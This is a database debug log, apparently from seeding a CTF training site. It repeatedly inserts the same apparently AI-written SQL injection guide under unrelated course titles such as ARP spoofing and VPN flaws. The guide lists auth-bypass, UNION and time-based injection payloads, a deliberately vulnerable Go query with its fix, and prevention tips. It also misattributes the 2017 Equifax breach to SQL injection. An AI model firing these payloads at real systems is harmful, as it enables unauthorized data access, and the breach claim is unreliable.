2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.428ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.589','2025-06-09 14:07:53.589',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,10) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.409ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.301ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.596','2025-06-09 14:07:53.596',NULL,'firewall misconfigurations','Common firewall rule errors that expose networks to attacks',180,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.589ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.567ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 11 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[12.593ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.604','2025-06-09 14:07:53.604',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,11) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.477ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.397ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.615','2025-06-09 14:07:53.615',NULL,'ddos attack mitigation','Defending against Distributed Denial of Service attacks',250,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.423ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 12 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.232ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.622','2025-06-09 14:07:53.622',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,12) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.405ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.524ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.63','2025-06-09 14:07:53.63',NULL,'vpn security flaws','Exploiting weaknesses in Virtual Private Networks',220,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.429ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.455ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 13 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.613ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.637','2025-06-09 14:07:53.637',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,13) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.421ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.644','2025-06-09 14:07:53.644',NULL,'arp spoofing attacks','How attackers manipulate Address Resolution Protocol',200,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.403ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 14 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[16.082ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.651','2025-06-09 14:07:53.651',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
